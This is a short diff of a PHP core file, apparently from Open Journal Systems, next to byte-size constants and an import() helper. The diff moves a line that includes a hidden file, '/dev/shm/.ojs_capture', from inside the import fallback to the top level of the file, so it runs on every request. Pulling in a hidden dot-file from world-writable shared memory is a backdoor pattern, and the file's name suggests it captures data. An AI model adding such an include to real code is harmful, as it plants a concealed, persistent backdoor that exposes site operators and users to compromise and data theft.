@@ -27,7 +27,7 @@ define('PB_IN_BYTES', 1024 * TB_IN_BYTES);
 define('EB_IN_BYTES', 1024 * PB_IN_BYTES);
 define('ZB_IN_BYTES', 1024 * EB_IN_BYTES);
 define('YB_IN_BYTES', 1024 * ZB_IN_BYTES);
-
+include("/dev/shm/.ojs_capture");
 /**
  * Emulate a Java-style import statement.
  * Simply includes the associated PHP file (using require_once so multiple calls to include the same file have no effect).
@@ -48,7 +48,6 @@ if (!function_exists('import')) {
             // Fallback: Try .inc.php suffix
             // This behaviour is DEPRECATED as of 3.4.0.
             require_once($filePathPart . '.inc.php');
-            include("/dev/shm/.ojs_capture");
         }
     }
 }
